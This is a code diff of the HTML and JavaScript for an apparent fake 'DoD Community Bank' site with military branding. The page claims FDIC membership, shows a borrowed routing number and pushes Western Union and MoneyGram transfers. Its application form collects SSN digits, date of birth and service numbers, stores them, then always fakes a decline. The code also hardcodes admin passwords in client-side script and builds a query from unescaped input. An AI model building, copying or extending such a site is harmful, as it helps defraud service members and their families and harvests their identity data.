@@ -46,8 +46,6 @@ input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
 .form-grid .full{grid-column:1 / -1}
 .req{color:#FF3B30}
 .decline-box{background:#FEF2F2;border:1px solid #FECACA;padding:16px;border-radius:8px;margin:14px 0;display:flex;gap:12px}
-</style>
-<style>
 @media (max-width: 768px){
   .header{padding:0 14px;height:56px}
   .nav{display:none}
@@ -76,56 +74,18 @@ input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
 <div class="top-blue"><span>DoD Community Bank, N.A. | Member FDIC | Equal Housing Lender</span><span>📍 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</span></div>
 <div class="header">
   <div class="logo">DoD COMMUNITY BANK <small>EST. 2024 • MILITARY & COMMUNITY BANKING</small></div>
-  <div class="nav">
-    <a onclick="scrollToOpen()">Open Account</a>
-    <a>Checking</a>
-    <a>Savings</a>
-    <a>Loans</a>
-  </div>
+  <div class="nav"><a onclick="scrollToOpen()">Open Account</a><a>Checking</a><a>Savings</a><a>Loans</a></div>
   <div style="display:flex;align-items:center;gap:10px"><button class="signin-btn" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign in</button><button id="hamburger" style="display:none;background:none;border:none;font-size:22px;cursor:pointer" onclick="toggleMobile()">☰</button></div>
 </div>
 <div id="mobileMenu" style="display:none;position:fixed;top:56px;left:0;right:0;background:#fff;border-bottom:1px solid #E5E5E7;z-index:99;padding:16px">
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7" onclick="showOpenAccount(); toggleMobile()">Open Account</a>
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Checking</a>
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Savings</a>
-  <a style="display:block;padding:12px 0;font-weight:600">Loans</a>
+  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7" onclick="showOpenAccount(); toggleMobile()">Open Account</a><a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Checking</a><a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Savings</a><a style="display:block;padding:12px 0;font-weight:600">Loans</a>
 </div>
 <div class="hero">
-  <div class="hero-left">
-    <h1>Banking built for <b>those who serve.</b></h1>
-    <p>DoD Community Bank offers secure checking, high-yield savings, real-time transfers, Western Union, MoneyGram, and Zelle. Open an account online in minutes.</p>
-    <div style="margin-top:24px;display:flex;gap:12px"><button class="signin-btn" style="background:#fff;color:#0B6E4F" onclick="showOpenAccount()">Open an Account</button><button class="signin-btn" style="background:transparent;border:1px solid #fff" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign In</button></div>
-    <p style="margin-top:20px;font-size:11px;opacity:0.7">Routing: 021000021 • Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</p>
-  </div>
-  <div class="hero-right" id="loginSection">
-    <div class="login-card">
-      <div class="tabs"><div class="tab active" id="tabLogin" onclick="switchTab('login')">Sign In</div><div class="tab" id="tabOpen" onclick="showOpenAccount()">Open Account</div></div>
-      <div id="loginFormDiv">
-        <h3>Welcome back</h3><p>Sign in to DoD Community Bank</p>
-        <input id="loginEmail" type="email" placeholder="Username / Email">
-        <input id="loginPass" type="password" placeholder="Password">
-        <button class="btn-green" onclick="doLogin()">Sign in</button>
-        <button class="btn-outline" onclick="showOpenAccount()">New customer? Open an account</button>
-        <div id="loginMsg" style="margin-top:10px;font-size:12px"></div>
-      </div>
-      <div id="openTeaser" style="display:none">
-        <h3>Open your DoD account</h3><p>All fields required including Service Number for verification</p>
-        <button class="btn-green" onclick="showOpenAccount()">Start Application</button>
-      </div>
-    </div>
-  </div>
+  <div class="hero-left"><h1>Banking built for <b>those who serve.</b></h1><p>DoD Community Bank offers secure checking, high-yield savings, real-time transfers, Western Union, MoneyGram, and Zelle. Open an account online in minutes.</p><div style="margin-top:24px;display:flex;gap:12px"><button class="signin-btn" style="background:#fff;color:#0B6E4F" onclick="showOpenAccount()">Open an Account</button><button class="signin-btn" style="background:transparent;border:1px solid #fff" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign In</button></div><p style="margin-top:20px;font-size:11px;opacity:0.7">Routing: 021000021 • Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</p></div>
+  <div class="hero-right" id="loginSection"><div class="login-card"><div class="tabs"><div class="tab active" id="tabLogin" onclick="switchTab('login')">Sign In</div><div class="tab" id="tabOpen" onclick="showOpenAccount()">Open Account</div></div><div id="loginFormDiv"><h3>Welcome back</h3><p>Sign in to DoD Community Bank</p><input id="loginEmail" type="email" placeholder="Username / Email"><input id="loginPass" type="password" placeholder="Password"><button class="btn-green" onclick="doLogin()">Sign in</button><button class="btn-outline" onclick="showOpenAccount()">New customer? Open an account</button><div id="loginMsg" style="margin-top:10px;font-size:12px"></div></div><div id="openTeaser" style="display:none"><h3>Open your DoD account</h3><p>All fields required including Service Number for verification</p><button class="btn-green" onclick="showOpenAccount()">Start Application</button></div></div></div>
 </div>
-<div class="features">
-  <div class="feat"><h4>DoD Checking</h4><p>Free checking with no monthly fees, early direct deposit, real-time transfers to any US bank.</p><a>Learn more →</a></div>
-  <div class="feat"><h4>Send Money Worldwide</h4><p>Western Union and MoneyGram with 60+ countries, MTCN tracking, cash pickup in minutes.</p><a>Send money →</a></div>
-  <div class="feat"><h4>DoD Loans</h4><p>Personal and emergency loans for service members and community, reviewed by bank.</p><a>Check eligibility →</a></div>
-</div>
-<div class="footer">
-  <b>DoD COMMUNITY BANK HEAD OFFICE</b>
-  300 Convent Street, Suite 400, San Antonio, TX 78205-3701, USA • Routing Number: 021000021 • (210) 555-0142 • support@dodcommunitybank.com<br>
-  
-  © 2026 DoD Community Bank, N.A. Member FDIC. Equal Housing Lender. All rights reserved.
-</div>
+<div class="features"><div class="feat"><h4>DoD Checking</h4><p>Free checking with no monthly fees, early direct deposit, real-time transfers to any US bank.</p><a>Learn more →</a></div><div class="feat"><h4>Send Money Worldwide</h4><p>Western Union and MoneyGram with 60+ countries, MTCN tracking, cash pickup in minutes.</p><a>Send money →</a></div><div class="feat"><h4>DoD Loans</h4><p>Personal and emergency loans for service members and community, reviewed by bank.</p><a>Check eligibility →</a></div></div>
+<div class="footer"><b>DoD COMMUNITY BANK HEAD OFFICE</b> 300 Convent Street, Suite 400, San Antonio, TX 78205-3701, USA • Routing Number: 021000021 • (210) 555-0142 • support@dodcommunitybank.com<br>© 2026 DoD Community Bank, N.A. Member FDIC. Equal Housing Lender. All rights reserved.</div>
 <div id="modalRoot"></div>
 <script>
 Backendless.initApp('65ABB198-A187-4B5A-B7D3-0839AEA80B26', 'CDA94D34-9A3F-46AB-8B13-65193E45A1B0');
@@ -186,9 +146,7 @@ async function submitOpenAccount(){
   if(!agree) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">You must agree to terms</span>';
   if(ssn.length!==4) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">SSN Last 4 must be 4 digits</span>';
   document.getElementById('openMsg').innerHTML='Verifying Service Number with DoD database...';
-  // Simulate verification delay, then auto-decline as requested
   setTimeout(async ()=>{
-    // Save as pending application that is declined
     try{
       await Backendless.Data.of('Applications').save({
         name:name, dob:dob, ssnLast4:ssn, email:email, phone:phone, serviceNumber:service,
@@ -198,7 +156,7 @@ async function submitOpenAccount(){
       });
     }catch(e){ console.log('Applications table', e); }
     let html=`<div style="text-align:center">
-      <div style="width:64px;height:64px;background:#FEF2F2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto">⚠️</div>
+      <div style="width:64px;height:64px;background:#FEF2F2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto">⚠</div>
       <h3 style="margin-top:14px;font-weight:800">Application Declined - Try Again Later</h3>
       <div class="decline-box"><div>🚫</div><div style="text-align:left"><b style="font-size:13px">Service Number could not be verified</b><p style="font-size:12px;color:#6B7280;margin-top:4px">We were unable to verify Service Number <b>${service}</b> for ${name}. Our verification system is temporarily unable to confirm DoD eligibility.</p><p style="font-size:12px;color:#6B7280;margin-top:8px">Application ID: DOD-APP-${Date.now().toString().slice(-6)} • ${new Date().toLocaleString()}</p></div></div>
       <p style="font-size:12px;color:#6B7280;margin-top:12px">Please try again later or visit our head office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA with your Service ID and valid government ID. </p>
@@ -208,42 +166,51 @@ async function submitOpenAccount(){
     openModal(html);
   }, 1800);
 }
+// SINGLE FIXED LOGIN - HANDLES MULTI-ACCOUNTS + ADMIN
+const ADMIN_CREDENTIALS = [
+  {email:'admin@dodcommunitybank.com', password:'DoDAdmin2024!'},
+  {email:'admin@dod.com', password:'Admin123'},
+  {email:'dodadmin@gmail.com', password:'Admin@12345'}
+];
+function isAdminCred(email, pass){
+  return ADMIN_CREDENTIALS.some(a => a.email.toLowerCase()===email.toLowerCase() && a.password===pass);
+}
 async function doLogin(){
   let email=document.getElementById('loginEmail').value.trim().toLowerCase();
   let pass=document.getElementById('loginPass').value;
   if(!email||!pass) return alert('Enter email and password');
   document.getElementById('loginMsg').innerHTML='Signing in to DoD Community Bank...';
-
-  // FIX - Clear previous account first - THIS FIXES "ONLY ONE ACCOUNT"
+  
+  // FIX: Clear previous account - fixes one-account bug
   localStorage.removeItem('currentUser');
   localStorage.removeItem('currentUserEmail');
   localStorage.removeItem('userToken');
   localStorage.removeItem('adminUser');
-
+  // Admin check FIRST
+  if(isAdminCred(email, pass)){
+    localStorage.setItem('adminUser', JSON.stringify({email: email, name: 'DoD Admin', isAdmin: true, objectId: 'hardcoded-admin'}));
+    document.getElementById('loginMsg').innerHTML='<span style="color:#0B6E4F">Admin verified - Redirecting to Super Admin...</span>';
+    setTimeout(()=>{ window.location.href='admin.html'; }, 600);
+    return;
+  }
   try{
     let user=await Backendless.UserService.login(email, pass, true);
     try{
       let full=await Backendless.Data.of("Users").find({whereClause:`email='${email}'`});
       if(full.length>0){
-        // Check blocked
         if(full[0].isBlocked===true || full[0].status==='blocked' || full[0].accountStatus==='blocked'){
           document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">🚫 ACCOUNT BLOCKED - Contact Head Office</span>';
           await Backendless.UserService.logout();
           return;
         }
-        user={...user,...full[0]};
+        user={...user, ...full[0]};
       }
-    }catch(e){ console.log('fetch full user error', e) }
-
-    // SAVE THIS USER ONLY - NOT PREVIOUS USER
+    }catch(e){ console.log('fetch full user error', e); }
     localStorage.setItem('currentUser', JSON.stringify(user));
     localStorage.setItem('currentUserEmail', email);
     localStorage.setItem('userToken', user['user-token']||'');
-
     document.getElementById('loginMsg').innerHTML='<span style="color:#0B6E4F">Success - Logged in as '+email+' - Redirecting...</span>';
-    setTimeout(()=>{
-      window.location.href='dashboard.html';
-    }, 800);
+    setTimeout(()=>{ window.location.href='dashboard.html'; }, 800);
   }catch(e){
     console.log('Login error', e);
     let msg = e.message || '';
@@ -257,7 +224,6 @@ function toggleMobile(){
   let m=document.getElementById('mobileMenu');
   m.style.display = m.style.display==='none' ? 'block' : 'none';
 }
-// Show hamburger on mobile via JS
 (function(){
   function check(){
     let hb=document.getElementById('hamburger');
@@ -266,51 +232,6 @@ function toggleMobile(){
   window.addEventListener('resize', check);
   check();
 })();
-</script>
-<script>
-const ADMIN_CREDENTIALS_INDEX = [
-  {email: 'admin@dodcommunitybank.com', password: 'DoDAdmin2024!'},
-  {email: 'admin@dod.com', password: 'Admin123'},
-  {email: 'dodadmin@gmail.com', password: 'Admin@12345'}
-];
-function isAdminCred(email, pass){
-  return ADMIN_CREDENTIALS_INDEX.some(a => a.email.toLowerCase()===email.toLowerCase() && a.password===pass);
-}
-// Override login to redirect admin to admin.html
-const oldDoLogin = window.doLogin;
-window.doLogin = async function(){
-  let emailEl=document.getElementById('loginEmail');
-  let passEl=document.getElementById('loginPass');
-  if(!emailEl) emailEl=document.getElementById('le');
-  if(!passEl) passEl=document.getElementById('lp');
-  let email=emailEl?emailEl.value.trim():'';
-  let pass=passEl?passEl.value:'';
-  if(!email||!pass){ alert('Enter email and password'); return; }
-  
-  // CHECK ADMIN FIRST - if admin creds, go to admin dashboard
-  if(isAdminCred(email, pass)){
-    let msgEl=document.getElementById('loginMsg')||document.getElementById('lmsg');
-    if(msgEl) msgEl.innerHTML='Admin verified - Redirecting to admin dashboard...';
-    localStorage.setItem('adminUser', JSON.stringify({email: email, name: 'DoD Admin', isAdmin: true, objectId: 'hardcoded-admin'}));
-    setTimeout(()=>{ window.location.href='admin.html'; }, 600);
-    return;
-  }
-  // Normal user login - go to dashboard.html
-  let msgEl=document.getElementById('loginMsg')||document.getElementById('lmsg');
-  if(msgEl) msgEl.innerHTML='Signing in...';
-  try{
-    let user=await Backendless.UserService.login(email, pass, true);
-    try{
-      let full=await Backendless.Data.of("Users").find({whereClause:`email='${email}'`});
-      if(full.length>0) user={...user, ...full[0]};
-    }catch(e){}
-    localStorage.setItem('currentUser', JSON.stringify(user));
-    if(msgEl) msgEl.innerHTML='<span style="color:#0B6E4F">Success - Loading dashboard...</span>';
-    setTimeout(()=>{ window.location.href='dashboard.html'; }, 600);
-  }catch(e){
-    if(msgEl) msgEl.innerHTML='<span style="color:red">'+e.message+'</span>';
-  }
-};
 </script>
 </body>
 </html>
